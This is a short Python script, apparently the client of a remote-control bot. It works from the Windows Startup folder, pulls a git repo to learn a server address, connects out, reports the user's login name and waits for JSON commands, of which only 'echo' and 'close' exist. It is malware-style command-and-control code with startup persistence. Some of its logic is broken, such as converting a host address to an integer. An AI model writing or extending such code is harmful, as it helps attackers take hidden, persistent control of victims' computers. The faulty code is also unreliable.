import json
import git
import time
import os
import socket

hostname = os.getlogin()  # nome dell'utente di sistema
actual_dir = os.path.join('C:\\Users', str(hostname), 'AppData\Roaming\Microsoft\Windows\Start menu\Programs\Startup')


def pull():
    print("[*] pulling...")
    repo = git.Repo(actual_dir+'\setup')
    o = repo.remotes.origin
    o.pull()

def search_server_to_connect():
    opened = False
    while not opened:
        try:
            print("[*]searching file...")
            f=open("setup\\addres.txt","r")
            text = f.read()
            host, port = text.split(":")
            print("[*]FOUND: "+host+" "+port)
            opened = True
        except FileNotFoundError:
            print("[*]file not found :(")
            time.sleep(20)
            pull()
    return int(host),int(port)

target_host, target_port = search_server_to_connect()
hostname = os.getlogin()


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connected = False
while not connected:
    try:
        print("[*]try connection...")
        client.connect((target_host,target_port))
        connected = True
        print("[*]CONNECTED")
    except:
        print("[*]error in connection :(")
    time.sleep(3)

close = False

msg = "Hello! i'm " + hostname + " give me commands"
client.send(msg.encode())
while not close:

    response = (client.recv(4096)).decode()
    response_json = json.loads(response)
    print(response_json)
    if response_json["op"] == "echo":
        client.send(response_json["args"].encode())
    elif response_json["op"] == "close":
        client.close()
        close = True





